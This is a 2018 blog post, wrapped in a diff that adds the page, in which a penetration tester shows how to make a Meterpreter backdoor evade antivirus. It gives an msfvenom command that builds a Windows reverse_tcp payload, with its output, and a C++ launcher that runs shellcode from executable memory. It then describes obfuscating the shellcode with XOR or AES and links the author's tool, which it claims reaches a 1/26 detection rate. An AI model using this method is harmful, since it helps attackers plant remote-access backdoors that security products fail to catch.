@@ -1,0 +1,169 @@
+
+
+
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A Pathetic Soul, ">
+
+
+        <title>Let's Make Meterpreter Nearly Great Again</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/theme/css/pure.css">
+    <link rel="stylesheet" href="/theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="/author/engindemirbilek.html" title="See posts by EnginDemirbilek">
+                </a>
+                <h2 class="article-info">EnginDemirbilek</h2>
+                <small class="about-author"></small>
+                <h5>Published</h5>
+                <p>Sun 08 July 2018</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>Let's Make Meterpreter Nearly Great Again</h1>
+                        <p class="post-meta">
+                            // under                         </p>
+                </header>
+            </section>
+            <p>As a penetration tester, i do face with vary of Anti-Malware & Anti-Attack products in my engagments. Since i have limited amount of time, i always look for simplest and fastest way to bypass those products.
+Sometimes bypass techiques requiries a lot of technical background especially in ASM but on the other hand its also possible to bypass them with serioulsy small amount of effort.
+In this article, i will show you a simple way that i often use to create Meterpreter backdoor which bypasses most of the AV products.	
+</p>
+<p><strong>Creating Meterpreter</strong></p>
+
+<p>
+Because of the easy usage and great capabilities, meterpreter is the way to go for most of Infosec workers and individual hackers.
+Yes i used the "individual hackers" title because its known that most of APT groups use its own tools to perform spying actions.
+Since we have no interest in spying actions, lets keep continue with our meterpreter.
+In order to create an executable sample, all we need is one line of terminal code which is below:
+</p>
+
+<div class="highlight"><pre><span></span>
+root@kali:~/Desktop# msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f exe -o native_meterpreter.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+Saved as: native_meterpreter.exe
+</pre></div>
+
+<p>
+But the problem is, since its an open source project nearly every AV product will mark it as a Malware. Therefore, its nearly impossible to use it in real life engagments.
+</p>
+
+<p><strong>Antiscan.me Result of Default Meterpreter Executable</p></strong>
+<p><img alt="Default Meterpreter" src="/images/meterpreter/antiscanme_default_meterpreter.png"></p>
+
+<p>When bypassing AV products, the main behaviour should be taken is changing default structers which is flagged by AV products.
+So we can reduce detection by simply changing default Meterpreter template with our shellcode launcher.
+Here is the basic C++ code to execute shellcode:
+</p>
+
+<div class="highlight"><pre><span></span>
+#include "Windows.h"
+#include <string>
+using namespace std;
+
+int main(){
+
+char shellcode[] = "";
+
+
+
+void *DkCBQcsBE = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //Allocate memory for shellcode with the execution permission.
+memcpy(DkCBQcsBE, shellcode, sizeof shellcode); //PUT shellcode into memory
+((void(*)())DkCBQcsBE)(); //execute it
+}
+</pre></div>
+
+<p>Lets use default meterpreter shellcode inside of our new template and give it a shot on Antiscan.me. </p>
+
+
+<p><strong>Antiscan.me Result of Non-Default Meterpreter Executable</p></strong>
+<p><img alt="Default Meterpreter" src="/images/meterpreter/antiscanme_default_meterpreter.png"></p>
+
+<p>Detection rate is reduced more than half, but its still detectable by most popular AV products. </p>
+<p><img alt="Non-Default Meterpreter" src="/images/meterpreter/antiscanme_non_default_meterpreter.png"></p>
+
+<p>
+The reason why most of the popular AV products still detecting our payload is the default shellcode string in our launcher. Not only the shellcode itself but also the keyword "shellcode" can trigger AV products so we need to prevent using them directly.
+We can simply change shellcode variable to random string and in order to obfuscate real shellcode we can use vary amount of encryption & decryption techniques including XOR, AES or custom ways.
+To do so, i've created a simple C++ script to create obfuscated shellcode launchers.
+</p>
+
+
+<p>Here is a sample of obfuscated shellcode launcher:</p>
+<p><img alt="Default Meterpreter" src="/images/meterpreter/shellcode_launcher.png"></p>
+
+
+<p>Detection rate of obfuscated shellcode launcher:</p>
+<p><img alt="Default Meterpreter" src="/images/meterpreter/antiscanme_flip.png"></p>
+
+
+<p>1/26, its pretty nice and usable. </p>
+
+
+
+<p>Flip github: <a href="https://github.com/EnginDemirbilek/Flip">Flip</a></p>
+           <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<footer class="footer">
+    <p>&copy; A Pathetic Soul &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+</body>
+</html>
